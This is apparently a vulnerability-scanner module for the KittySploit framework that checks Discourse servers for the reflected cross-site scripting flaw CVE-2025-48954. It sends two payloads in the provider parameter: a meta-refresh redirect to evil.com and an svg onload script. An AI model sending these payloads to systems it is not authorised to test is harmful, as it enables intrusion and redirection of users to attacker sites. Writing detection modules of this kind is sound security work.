#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Discourse OAuth Social Login - Cross-site Scripting"""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        "name": 'Discourse OAuth Social Login - Cross-site Scripting',
        "description": 'Discourse < 3.5.0.beta6 reflects unsanitized provider in /auth/failure.',
        "author": ["KittySploit Team"],
        "severity": 'high',
        "cve": 'CVE-2025-48954',
        "tags": ['web', 'scanner', 'cve', 'cve2025', 'vuln', 'discourse', 'xss', 'oauth'],
        "agent": {
            "risk": "active",
            "effects": ["network_probe"],
            "expected_requests": 2,
            "reversible": True,
            "approval_required": False,
            "produces": ["tech_hints", "risk_signals", "endpoints"],
            "cost": 1.0,
            "noise": 0.2,
            "value": 1.0,
        },
        "references": ['https://github.com/discourse/discourse/security/advisories/GHSA-26p5-mjjh-wfcf', 'https://nvd.nist.gov/vuln/detail/CVE-2025-48954'],
    }

    def run(self):
        marker = "XSS-CVE-2025-48954"
        paths = (
            '/auth/failure?provider=%3Cmeta%20http-equiv%3D%22refresh%22%20content%3D%220%3Burl%3Dhttps%3A//evil.com%22%3E',
            f"/auth/failure?provider=<svg/onload=alert('{marker}')>",
        )
        for path in paths:
            r = self.http_request(method="GET", path=path, allow_redirects=False)
            if not r or r.status_code != 200:
                continue
            body = r.text or ""
            if "discourse" not in body.lower():
                continue
            reflected = (
                '<meta http-equiv="refresh" content="0;url=https://evil.com">' in body
                or (marker in body and "onload=alert(" in body)
            )
            if not reflected:
                continue
            headers_blob = "\n".join(f"{k}: {v}" for k, v in r.headers.items()).lower()
            # XSS more meaningful without CSP
            self.set_info(
                severity="high",
                cve="CVE-2025-48954",
                reason="Discourse /auth/failure reflected unsanitized provider payload",
                path=path,
                csp_present="content-security-policy" in headers_blob,
                confidence="high",
            )
            return True
        return False
